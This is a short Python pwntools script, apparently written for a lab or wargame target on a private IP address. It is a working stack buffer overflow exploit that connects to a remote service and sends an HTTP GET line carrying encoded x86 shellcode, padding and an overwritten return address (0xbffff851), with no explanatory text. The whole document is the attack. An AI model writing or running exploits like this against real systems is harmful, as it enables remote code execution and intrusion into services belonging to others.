#!/usr/bin/python
from pwn import *
import struct

s = remote("192.168.135.133", 20000)

print s.recvuntil(":-)\n")

size = 139

shellcode =  ""
shellcode += "\xb8\xe6\x42\xbc\x8c\xd9\xe8\xd9\x74\x24\xf4\x5e"
shellcode += "\x33\xc9\xb1\x12\x31\x46\x12\x83\xee\xfc\x03\xa0"
shellcode += "\x4c\x5e\x79\x1d\x8a\x69\x61\x0e\x6f\xc5\x0c\xb2"
shellcode += "\xe6\x08\x60\xd4\x35\x4a\x12\x41\x76\x74\xd8\xf1"
shellcode += "\x3f\xf2\x1b\x99\x7f\xac\x5b\x58\xe8\xaf\x63\x4b"
shellcode += "\xb4\x26\x82\xdb\x22\x69\x14\x48\x18\x8a\x1f\x8f"
shellcode += "\x93\x0d\x4d\x27\x42\x21\x01\xdf\xf2\x12\xca\x7d"
shellcode += "\x6a\xe4\xf7\xd3\x3f\x7f\x16\x63\xb4\xb2\x59"
shellcodeSize = len(shellcode)

jmpAddress = struct.pack("I", 0xbffff851)
padding = "A"*(size - shellcodeSize)

payload = shellcode + padding + jmpAddress
s.sendline("GET {0} HTTP/1.1".format(payload))

print s.recvall()